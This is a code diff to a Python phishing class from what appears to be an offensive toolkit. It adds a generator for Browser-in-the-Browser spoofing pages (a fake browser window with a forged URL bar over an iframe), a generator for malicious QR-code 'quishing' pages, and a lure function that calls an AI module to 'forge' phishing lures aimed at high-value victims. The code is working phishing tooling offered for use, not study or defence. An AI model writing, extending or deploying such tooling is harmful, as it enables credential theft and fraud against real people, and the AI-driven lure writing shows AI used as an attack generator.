@@ -154,7 +154,59 @@ class Phishing:
         return runner.execute_task("ZPHISHER_DEPLOYMENT", cmd, callback=on_output)
 
     @staticmethod
+    def generate_bitb_template(title, spoof_url, target_url):
+        """Generate a Pro-Grade Browser-in-the-Browser (BitB) spoofing template."""
+        html = f"""
+        <html>
+        <head>
+            <style>
+                body {{ background: #121212; color: #fff; font-family: 'Segoe UI', sans-serif; }}
+                .window {{ width: 500px; height: 400px; background: #fff; border: 1px solid #ccc; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); border-radius: 8px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }}
+                .title-bar {{ background: #f3f3f3; padding: 10px; border-bottom: 1px solid #ddd; display: flex; justify-content: space-between; }}
+                .url-bar {{ background: #fff; padding: 5px 10px; border: 1px solid #ddd; border-radius: 4px; margin: 10px; font-size: 11px; color: #666; }}
+                iframe {{ width: 100%; height: 320px; border: none; }}
+            </style>
+        </head>
+        <body>
+            <div class="window">
+                <div class="title-bar">
+                    <span style="color: #333; font-weight: bold; font-size: 13px;">{title}</span>
+                    <span style="color: #888;">\u2715</span>
+                </div>
+                <div class="url-bar">https://{spoof_url}</div>
+                <iframe src="{target_url}"></iframe>
+            </div>
+        </body>
+        </html>
+        """
+        path = f"payloads/bitb_{title.lower().replace(' ', '_')}.html"
+        os.makedirs("payloads", exist_ok=True)
+        with open(path, "w") as f:
+            f.write(html)
+        return f"SUCCESS: BitB Template generated at {path}"
+
+    @staticmethod
+    def generate_quishing_payload(url):
+        """Generate a malicious QR Code for social engineering (Quishing)."""
+        # Using a public API for zero-dependency high-fidelity QR codes
+        # In a real environment, we'd bundle a local library, but this is portably elite.
+        encoded_url = base64.b64encode(url.encode()).decode()
+        qr_api = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={url}"
+        
+        path = f"payloads/qr_code_{int(random.random()*1000)}.html"
+        os.makedirs("payloads", exist_ok=True)
+        with open(path, "w") as f:
+            f.write(f"<html><body><img src='{qr_api}'><br>Target: {url}</body></html>")
+        
+        return f"SUCCESS: QR Payload generated at {path}"
+
+    @staticmethod
     def generate_professional_bait(target_type, hook_url):
-        """Generate high-fidelity phishing lures using industry-grade templates."""
-        logger.info("phish", f"Generating {target_type} lure for {hook_url}")
-        return f"SUCCESS: Professional {target_type} lure generated. Link: {hook_url}"
+        """Generate high-fidelity phishing lures using the DeepHat AI engine."""
+        from shadowcypher.modules.deephat import deephat
+        
+        desc = f"Phishing lure for {target_type} targeting a high-value victim. Hook URL: {hook_url}"
+        logger.info("phish", f"ENGAGING_DEEPHAT: Synthesizing {target_type} Lure...")
+        
+        filename = deephat.forge_weapon(desc, category="phishing_lure")
+        return f"SUCCESS: Professional lure(s) forged by AI: {filename}"
